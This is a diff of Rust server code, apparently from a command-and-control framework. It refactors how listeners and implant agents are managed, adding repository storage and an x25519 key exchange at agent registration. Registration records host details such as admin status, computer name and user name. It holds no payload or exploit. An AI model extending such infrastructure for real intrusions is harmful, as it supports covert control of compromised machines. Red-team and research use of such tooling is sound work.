@@ -1,60 +1,58 @@
 use application::domain::model::agent_model::AgentModel;
 use application::domain::model::id::{AgentId, ListenerId};
-use application::domain::model::listener_model::{ListenerModel, ListenerProtocol};
-use std::{collections::HashMap, net::SocketAddr};
+use application::domain::model::listener_model::ListenerModel;
+use application::outbound::agent_repository::AgentRepository;
+use application::outbound::error::C2Error;
+use application::outbound::listener_repository::ListenerRepository;
+use rand::RngExt;
+use x25519_dalek::{PublicKey, StaticSecret, x25519};
+use std::collections::HashMap;
+use std::sync::Arc;
 use tokio::sync::{mpsc, oneshot};
 
 use crate::actor::agent_actor::AgentHandle;
 use crate::actor::listener_actor::ListenerHandle;
-use crate::c2_message::{AgentMessage, C2Message, ListenerMessage};
+use crate::c2_message::{C2Message, ListenerMessage};
 
 pub struct C2ManagerActor {
     sender: mpsc::UnboundedSender<C2Message>, // C2ManagerにListenerやAgentからメッセージを送信する用
     receiver: mpsc::UnboundedReceiver<C2Message>,
     listener_handles: HashMap<ListenerId, ListenerHandle>,
     agent_handles: HashMap<AgentId, AgentHandle>,
+    listener_repository: Arc<dyn ListenerRepository>,
+    agent_repository: Arc<dyn AgentRepository>,
 }
 
 impl C2ManagerActor {
     pub fn new(
         sender: mpsc::UnboundedSender<C2Message>,
         receiver: mpsc::UnboundedReceiver<C2Message>,
+        listener_repository: Arc<dyn ListenerRepository>,
+        agent_repository: Arc<dyn AgentRepository>,
     ) -> Self {
-        Self { sender, receiver, listener_handles: HashMap::new(), agent_handles: HashMap::new() }
-    }
-
-    async fn run(&mut self) {
-        while let Some(msg) = self.receiver.recv().await {
-            self.handle_message(msg);
+        Self { 
+            sender, 
+            receiver, 
+            listener_handles: HashMap::new(), 
+            agent_handles: HashMap::new(),
+            listener_repository,
+            agent_repository,
         }
     }
 
-    fn handle_message(&mut self, msg: C2Message) {
+    async fn run(mut self) {
+        while let Some(msg) = self.receiver.recv().await {
+            self.handle_message(msg).await;
+        }
+    }
+
+    async fn handle_message(&mut self, msg: C2Message) {
         match msg {
-            C2Message::QueryListener { listener_id, reply } => {
-                // SQLXでいい
-                let model = self.listener_handles.get(&listener_id)
-                    .map(|l| l.model.clone())
-                    .ok_or(anyhow::anyhow!("Listener {listener_id} not found"));
-                let _ = reply.send(model);
-            },
-
-            C2Message::ListListener { reply } => {
-                // SQLXでいい
-                let models: Vec<ListenerModel> = self.listener_handles
-                    .values()
-                    .into_iter()
-                    .map(|l| l.model.clone())
-                    .collect();
-                let _ = reply.send(Ok(models));
-            },
-
-            C2Message::AddListener { name, addr, protocol, reply } => {
+            C2Message::AddListener { listener, reply } => {
                 let listener_id = ListenerId::new();
-                let listener_handle = ListenerHandle::new(listener_id.clone(), name, addr, protocol, self.sender.clone());
-                let model = listener_handle.model.clone();
+                let listener_handle = ListenerHandle::new(listener.clone(), self.sender.clone());
                 self.listener_handles.insert(listener_id, listener_handle);
-                let _ = reply.send(Ok(model));
+                let _ = reply.send(Ok(listener));
             },
 
             C2Message::RemoveListener { listener_id, reply } => {
@@ -62,28 +60,72 @@ impl C2ManagerActor {
                 let _ = reply.send(Ok(()));
             },
 
-            C2Message::ListAgent { listener_id: _, reply } => {
-                let _ = reply.send(Ok(self.agent_handles.values().map(|a| a.model.clone()).collect()));
+            C2Message::ListListeners { reply } => {
+                let result = self.listener_repository.list()
+                    .await
+                    .map_err(|e| anyhow::anyhow!("{e}"));
+
+                let _ = reply.send(result);
             },
 
-            C2Message::AddAgent { listener_id, reply, received_pubkey } => {
-                let agent_id = AgentId::new();
-                let agent_handle = AgentHandle::new(listener_id, agent_id.clone(), received_pubkey, self.sender.clone());
-                self.agent_handles.insert(agent_id.clone(), agent_handle);
-                log::info!("received pubkey: {:?}", received_pubkey);
+            C2Message::ListAgent { listener_id, reply } => {
+                let result = self.agent_repository
+                    .list_by_listener_id(listener_id)
+                    .await
+                    .map_err(|e| anyhow::anyhow!("{e}"));
 
-                let agent_handle = self.agent_handles.get(&agent_id).unwrap();
-                let msg = AgentMessage::Query { reply };
-                let _ = agent_handle.sender.send(msg);
+                let _ = reply.send(result);
             },
 
             C2Message::QueryAgent { agent_id, reply } => {
-                let Some(a) = self.agent_handles.get(&agent_id) else {
-                    log::error!("agent {agent_id} not found, but QueryAgent message received.");
-                    return;
-                };
-                let msg = AgentMessage::Query { reply };
-                let _ = a.sender.send(msg);
+                let result = self.agent_repository
+                    .find_by_id(agent_id)
+                    .await
+                    .map_err(|e| anyhow::anyhow!("{e}"));
+
+                let _ = reply.send(result);
+            },
+
+            C2Message::AddAgent { 
+                    listener_id, 
+                    process_id, 
+                    thread_id, 
+                    arch, 
+                    is_admin, 
+                    process_name, 
+                    os, 
+                    domain_name, 
+                    computer_name, 
+                    user_name,
+                    reply,
+                    received_pubkey 
+            } => {
+                let mut secret_bytes = [0_u8; 32];
+                rand::rng().fill(&mut secret_bytes);
+                let secret = StaticSecret::from(secret_bytes);
+                let session_pubkey = PublicKey::from(&secret).to_bytes();
+                let shared_secret = x25519(secret.to_bytes(), received_pubkey);
+
+                let agent = self.agent_repository.insert(
+                    listener_id, 
+                    shared_secret,
+                    process_id, 
+                    thread_id, 
+                    arch, 
+                    is_admin, 
+                    process_name, 
+                    os, 
+                    domain_name, 
+                    computer_name, 
+                    user_name
+                )
+                .await
+                .map_err(|e| C2Error::Repository(e)).unwrap(); // TODO
+
+                let agent_handle = AgentHandle::new(agent.clone(),  self.sender.clone());
+                self.agent_handles.insert(agent.clone().id, agent_handle);
+
+                let _ = reply.send(Ok((agent, session_pubkey)));
             },
 
             C2Message::ToListener { listener_id, msg } => {
@@ -113,21 +155,22 @@ pub struct C2ManagerHandle {
 }
 
 impl C2ManagerHandle {
-    pub fn new() -> Self {
+    pub fn new(
+        listener_repository: Arc<dyn ListenerRepository>,
+        agent_repository: Arc<dyn AgentRepository>,
+    ) -> Self {
         let (sender, receiver) = mpsc::unbounded_channel();
-        let mut actor = C2ManagerActor::new(sender.clone(), receiver);
+        let actor = C2ManagerActor::new(sender.clone(), receiver, listener_repository, agent_repository);
         tokio::spawn(async move { actor.run().await });
         Self { sender }
     }
 
     pub async fn add_listener(
         &self, 
-        name: String, 
-        addr: SocketAddr, 
-        protocol: ListenerProtocol, 
+        listener: ListenerModel,
     ) -> anyhow::Result<ListenerModel> {
         let (reply, rx) = oneshot::channel();
-        let msg = C2Message::AddListener { name, addr, protocol, reply };
+        let msg = C2Message::AddListener { listener, reply };
         let _ = self.sender.send(msg);
         
         rx.await?
@@ -135,7 +178,7 @@ impl C2ManagerHandle {
 
     pub async fn list_listener(&self) -> anyhow::Result<Vec<ListenerModel>> {
         let (reply, rx) = oneshot::channel();
-        let msg = C2Message::ListListener { reply };
+        let msg = C2Message::ListListeners { reply };
         let _ = self.sender.send(msg);
 
         rx.await?
@@ -179,7 +222,7 @@ impl C2ManagerHandle {
         rx.await?
     }
 
-    pub async fn get_agent(&self, agent_id: AgentId) -> anyhow::Result<AgentModel> {
+    pub async fn get_agent(&self, agent_id: AgentId) -> anyhow::Result<Option<AgentModel>> {
         let (reply, rx) = oneshot::channel();
         let msg = C2Message::QueryAgent { agent_id, reply };
         let _ = self.sender.send(msg);
